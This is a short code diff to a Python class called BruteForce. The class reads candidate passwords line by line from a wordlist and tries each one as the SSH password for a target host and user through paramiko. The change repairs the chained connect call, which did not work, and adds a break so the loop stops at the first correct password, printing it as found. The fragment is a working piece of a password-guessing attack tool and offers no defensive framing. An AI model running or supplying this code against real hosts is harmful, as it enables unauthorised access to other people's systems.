@@ -34,9 +34,12 @@ class BruteForce:
             line = linecache.getline(self.filename, i)
             line = line.strip()
             try:
-                paramiko.SSHClient().set_missing_host_key_policy(paramiko.AutoAddPolicy()).connect(self.host, username=self.user, password=line).close()
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(self.host, username=self.user, password=line)
                 q.put(line)   
                 print(f'[+] {line} is correct')
+                break
             except:
                 print(f'[-] {line} is not correct')
 
